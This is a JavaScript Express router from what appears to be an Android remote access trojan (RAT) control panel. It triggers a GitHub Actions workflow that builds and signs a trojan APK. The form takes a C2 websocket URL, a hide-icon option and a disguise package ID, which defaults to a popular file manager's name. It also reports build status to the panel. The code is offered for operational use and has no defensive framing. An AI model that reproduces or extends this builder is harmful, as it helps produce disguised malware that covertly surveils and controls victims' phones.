use strict';
// Dashboard APK builder — triggers the GitHub Actions workflow that
// builds + signs + renames the APK, and reports run status back to the panel.
//
// Required env:
//   GH_TOKEN        — GitHub PAT with `actions:write` + `contents:write` on the repo
//   GH_REPO         — "owner/repo" (e.g. "uyrer/rat-project")
//   GH_WORKFLOW     — workflow file name (default "build-apk.yml")
//   PUBLIC_C2_URL   — fallback C2 URL shown in the builder form
const express = require('express');
const https = require('https');

const router = express.Router();

const GH_TOKEN    = process.env.GH_TOKEN    || '';
const GH_REPO     = process.env.GH_REPO     || '';
const GH_WORKFLOW = process.env.GH_WORKFLOW || 'build-apk.yml';

function ghRequest(method, path, body) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const req = https.request({
      hostname: 'api.github.com',
      path,
      method,
      headers: {
        'User-Agent': 'rat-c2-builder',
        'Accept': 'application/vnd.github+json',
        'Authorization': `Bearer ${GH_TOKEN}`,
        'X-GitHub-Api-Version': '2022-11-28',
        ...(data ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } : {}),
      },
    }, res => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(buf); } catch {}
        resolve({ status: res.statusCode, json, raw: buf });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

// GET /api/builder/config — what the panel needs to render the form
router.get('/config', (_req, res) => {
  res.json({
    configured: Boolean(GH_TOKEN && GH_REPO),
    repo: GH_REPO,
    workflow: GH_WORKFLOW,
    defaultC2: process.env.PUBLIC_C2_URL
      || `${_req.protocol}://${_req.get('host')}`.replace(/^http/, 'ws') + '/ws',
  });
});

// POST /api/builder/trigger
// Body: { c2_url, app_label, app_id, hide_icon, apk_name, logo_base64, logo_url }
router.post('/trigger', async (req, res) => {
  if (!GH_TOKEN || !GH_REPO) {
    return res.status(500).json({ error: 'Builder not configured — set GH_TOKEN and GH_REPO env vars' });
  }

  const {
    c2_url = '',
    app_label = '',
    app_id = 'com.estrongs.android.pop',
    hide_icon = 'false',
    apk_name = '',
    logo_base64 = '',
    logo_url = '',
  } = req.body || {};

  if (!c2_url) return res.status(400).json({ error: 'c2_url required' });
  if (!/^wss?:\/\//.test(c2_url)) return res.status(400).json({ error: 'c2_url must start with ws:// or wss://' });
  if (logo_base64 && logo_base64.length > 900_000) return res.status(400).json({ error: 'logo too large (max ~650KB)' });

  const r = await ghRequest('POST', `/repos/${GH_REPO}/actions/workflows/${GH_WORKFLOW}/dispatches`, {
    ref: 'main',
    inputs: {
      c2_url,
      app_label: String(app_label).slice(0, 60),
      hide_icon: hide_icon === 'true' ? 'true' : 'false',
      app_id: String(app_id).slice(0, 120),
      apk_name: String(apk_name).slice(0, 80),
      logo_base64,
      logo_url: String(logo_url).slice(0, 500),
    },
  });

  if (r.status === 204 || r.status === 200) {
    return res.json({ ok: true, message: 'Build dispatched' });
  }
  res.status(r.status).json({ error: r.json?.message || `GitHub returned ${r.status}` });
});

// GET /api/builder/runs?limit=10 — recent workflow runs for the status panel
router.get('/runs', async (req, res) => {
  if (!GH_TOKEN || !GH_REPO) {
    return res.status(500).json({ error: 'Builder not configured — set GH_TOKEN and GH_REPO env vars' });
  }
  const limit = Math.min(parseInt(req.query.limit) || 10, 30);
  const r = await ghRequest('GET',
    `/repos/${GH_REPO}/actions/workflows/${GH_WORKFLOW}/runs?per_page=${limit}`);
  if (r.status !== 200) {
    return res.status(r.status).json({ error: r.json?.message || `GitHub returned ${r.status}` });
  }
  res.json((r.json.workflow_runs || []).map(w => ({
    id: w.id,
    number: w.run_number,
    status: w.status,
    conclusion: w.conclusion,
    branch: w.head_branch,
    actor: w.actor?.login,
    created: w.created_at,
    updated: w.updated_at,
    url: w.html_url,
    inputs: w.inputs || null,
  })));
});

module.exports = router;
